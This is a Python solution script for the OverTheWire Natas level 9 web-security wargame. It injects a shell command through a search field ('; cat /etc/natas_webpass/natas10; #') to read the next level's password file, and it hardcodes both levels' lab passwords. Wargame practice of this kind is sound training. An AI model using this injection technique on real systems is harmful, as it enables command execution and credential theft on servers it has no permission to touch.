from bs4 import BeautifulSoup
import requests
import re
def make():
    res = requests.get(url=url,auth=lvl_pass, params=my_params)
    soup = BeautifulSoup(res.text, 'html.parser')
    return (res, soup)
def writeResponse(enumerate = ''):
    with open(f'./response{enumerate}.html', 'w') as browserFile:
        browserFile.write(soup.prettify())

lvl_name = 'natas9'
url = f'http://{lvl_name}.natas.labs.overthewire.org'
lvl_pass = requests.auth.HTTPBasicAuth(f'{lvl_name}','Sda6t0vkOPkM8YeOZkAGVhFoaplvlJFd')
my_params = {'needle':'; cat /etc/natas_webpass/natas10; #', 'submit':'Search'} #This is where the magic happens.

res, soup = make()
writeResponse()
print(re.search(r"[a-zA-Z0-9]{32}",soup.find("div",id="content").text)[0])

'''
Genuinely one of my favorites. Classic shell injection.

Username: natas10
Password: D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE

'''
